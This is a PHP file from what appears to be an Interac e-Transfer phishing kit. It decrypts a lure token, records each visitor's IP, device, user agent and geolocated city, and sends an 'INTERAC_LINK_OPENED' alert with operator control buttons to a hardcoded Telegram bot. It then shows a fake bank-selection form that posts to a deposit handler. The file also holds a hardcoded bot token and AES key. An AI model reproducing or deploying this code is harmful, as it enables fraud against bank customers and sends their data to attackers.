<?php
session_start();

define('AES_KEY_HEX', 'a3f91b6cd024e8c29b76a149efcc5d42');
define('AES_METHOD',  'AES-128-CBC');
define('TOKEN_PARAM', 'deposit');

/* ----------- Helpers ----------- */
function get_client_ip() {
    $ip_keys = ['HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    $ip = 'UNKNOWN';
    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ip_list = explode(',', $_SERVER[$key]);
            $potential_ip = trim($ip_list[0]);
            if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                 $ip = $potential_ip;
                 break;
            }
        }
    }
    if (strpos($ip, '::ffff:') === 0) $ip = substr($ip, 7);
    return $ip;
}

function b64url_decode(string $data): string|false {
    $b64 = strtr($data, '-_', '+/');
    $pad = strlen($b64) % 4;
    if ($pad) $b64 .= str_repeat('=', 4 - $pad);
    return base64_decode($b64, true);
}
function fatal(string $msg, int $code = 400): void {
    http_response_code($code);
    error_log("[rp.do.php] $msg");
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Error</title>
    <style>body{font-family:sans-serif;background:#f8f8f8;color:#333;padding:2rem}
    .box{background:#fff;border:1px solid #ddd;padding:1.5rem;border-radius:6px;max-width:500px;margin:auto}</style></head>
    <body><div class="box"><h2>Something went wrong</h2><p>'.htmlspecialchars($msg).'</p></div></body></html>';
    exit;
}

function send_telegram_notification($message, $keyboard = null) {
    $BOT_TOKEN = '8292408817:AAFn4kxPe334jCGwW_GzaI-8SGuLexjE5sI';
    $CHAT_ID = '-1002922644009';
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage";
    $data = [
        'chat_id' => $CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    if ($keyboard) {
        $data['reply_markup'] = json_encode($keyboard);
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function log_to_admin($username, $action, $details, $path) {
    $url = "http://127.0.0.1:3000/api/external/log";
    $data = [
        'username' => $username,
        'action' => $action,
        'details' => $details,
        'path' => $path
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

/* ----------- Get token safely ----------- */
$token = $_GET[TOKEN_PARAM] ?? null;

if (!$token) {
    // No token provided → use default payload instead of redirect
    $payload = [
        'amount'         => '0.00',
        'senderName'     => 'Interac',
        'transaction_id' => 'N/A',
        'recipientName'  => '',
        'recipientEmail' => '',
        'purpose'        => '',
        'securityQuestion' => '',
        'securityAnswer'   => '',
    ];
} else {
    /* ----------- Decrypt token ----------- */
    $raw = b64url_decode($token);
    if ($raw === false) {
        fatal('Invalid token encoding');
    }

    $ivLen = openssl_cipher_iv_length(AES_METHOD);
    if (strlen($raw) <= $ivLen) fatal('Token too short');

    $iv   = substr($raw, 0, $ivLen);
    $ciph = substr($raw, $ivLen);

    $key = hex2bin(AES_KEY_HEX);
    if ($key === false) fatal('Invalid AES key');

    $plain = openssl_decrypt($ciph, AES_METHOD, $key, OPENSSL_RAW_DATA, $iv);
    if ($plain === false) fatal('Decryption failed');

    $payload = json_decode($plain, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        fatal('Invalid JSON payload: '.json_last_error_msg());
    }
}

/* ----------- Pull fields (fallback defaults) ----------- */
$amount        = $payload['amount']         ?? '0.00';
$senderName    = $payload['senderName']    ?? 'Interac';
$transactionId = $payload['transaction_id']?? 'N/A';
$recipientName = $payload['recipientName'] ?? '';
$recipientEmail= $payload['recipientEmail']?? '';
$purpose       = $payload['purpose']       ?? '';
$securityQuestion = $payload['securityQuestion'] ?? '';
$securityAnswer   = $payload['securityAnswer']   ?? '';

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$device = preg_match('/iPhone|iPad/i',$ua)?'iOS':(preg_match('/Android/i',$ua)?'Android':'Desktop');
$geo_city = 'Unknown';
if($ip !== 'UNKNOWN'){
    $geo_json = @file_get_contents("https://ipwhois.app/json/".urlencode($ip));
    if ($geo_json) {
        $g = json_decode($geo_json, true);
        if(is_array($g) && isset($g['city'])) $geo_city = htmlspecialchars((string)$g['city'], ENT_QUOTES);
    }
}

/* ----------- Store in session ----------- */
$_SESSION['transaction_data'] = [
    'transaction_id'   => $transactionId,
    'sender_name'      => $senderName,
    'sender'           => $senderName,
    'amount'           => $amount,
    'currency'         => 'CAD',
    'status'           => 'Pending',
    'expiry_date'      => date('M j, Y', strtotime('+30 days')),
    'expires'          => strtotime('+30 days'),
    'recipient_name'   => $recipientName,
    'recipient_email'  => $recipientEmail,
    'purpose'          => $purpose,
    'security_question' => $payload['securityQuestion'] ?? '',
    'security_answer'   => $payload['securityAnswer'] ?? '',
    'ip'               => $ip,
    'device'           => $device,
    'location'         => $geo_city,
    'user_agent'       => $ua,
    'initiated_at'     => date('Y-m-d H:i:s')
];

// Send notification
$msg  = "🟨🟨🟨🟨🟨🟨🟨🟨\n";
$msg .= "🏛 <b>SYSTEM ACCESS ALERT</b> 🏛\n";
$msg .= "────────────────────\n";
$msg .= "<b>Event:</b> <code>INTERAC_LINK_OPENED</code>\n";
$msg .= "<b>Status:</b> 🟡 <code>MONITORING</code>\n";
$msg .= "────────────────────\n";
$msg .= "💰 <b>Amount:</b> <code>\${$amount} CAD</code>\n";
$msg .= "👤 <b>Sender:</b> <code>{$senderName}</code>\n";
$msg .= "🆔 <b>Ref ID:</b> <code>{$transactionId}</code>\n";
$msg .= "────────────────────\n";
$msg .= "📱 <b>Device:</b> <code>{$device}</code>\n";
$msg .= "📍 <b>Location:</b> <code>{$geo_city}</code>\n";
$msg .= "🌐 <b>IP:</b> <code>{$ip}</code>\n";
$msg .= "────────────────────\n";
$msg .= "🕒 <b>Timestamp:</b> <code>" . date('Y-m-d H:i:s') . "</code>\n";
$msg .= "🟨🟨🟨🟨🟨🟨🟨🟨";

$adminUrl = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]/admin";
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '🔄 Reload', 'callback_data' => 'reload:' . $transactionId],
            ['text' => '⚠️ Alert', 'callback_data' => 'alert:' . $transactionId]
        ],
        [
            ['text' => '🚫 Block IP', 'callback_data' => 'block:' . $ip]
        ],
        [
            ['text' => '🖥 Open Admin Panel', 'url' => $adminUrl]
        ]
    ]
];

send_telegram_notification($msg, $keyboard);

// Log to admin panel
log_to_admin($senderName, 'interac_link_opened', [
    'amount' => $amount,
    'transaction_id' => $transactionId,
    'recipient_email' => $recipientEmail,
    'ip' => $ip,
    'device' => $device,
    'location' => $geo_city
], '/rp.do.php');

/* ----------- Formatting for UI ----------- */
$amountFormatted = number_format((float)str_replace(['$', ',', ' '], '', $amount), 2);
$sender = $senderName;
$ref    = $transactionId;
?>
<!doctype html>
<html lang="en">
<?php include __DIR__ . '/partials/header.php'; ?>
<body>
    <a class="skip-link" href="#main" style="position: absolute; left: -10000px;">Skip to content</a>
    
    <script src="assets/js/RP.do_inline_script.js"></script>
    <input id="manualDelay" type="hidden" value="0"/>
    <input id="adManualDelay" type="hidden" value="3000"/>

    <?php include __DIR__ . '/partials/nav.php'; ?>

    <main id="main" style="background: #fff;">
        <div style="position:relative; padding-bottom: 50px;" class="interac-max-width" data-role="page" data-enhance="false">
            <?php include __DIR__ . '/partials/transfer-details.php'; ?>
            
            <?php include __DIR__ . '/partials/fi-selection.php'; ?>
        </div>
    </main>

    <?php include __DIR__ . '/partials/footer.php'; ?>
    
    <form action="deposit.do.php" id="depositForm" method="post" name="deposit">
        <input id="hiddenFiId" name="fiId" type="hidden"/>
        <input id="hiddenCuId" name="cuId" type="hidden"/>
        <input id="hiddenFiLabel" name="hiddenFiLabel" type="hidden"/>
        <input id="hiddenCuLabel" name="hiddenCuLabel" type="hidden"/>
        <input id="isMobileBrowser" name="isMobileBrowser" type="hidden"/>
        <input id="language" name="language" type="hidden" value="en"/>
        <input id="paymentRefNum" name="paymentRefNum" type="hidden" value="<?= $ref ?>"/>
        <input id="hiddenTMUUID" name="hiddenTMUUID" type="hidden" value="<?= session_id() ?>"/>
    </form>

    <?php include __DIR__ . '/partials/scripts.php'; ?>
</body>
</html>
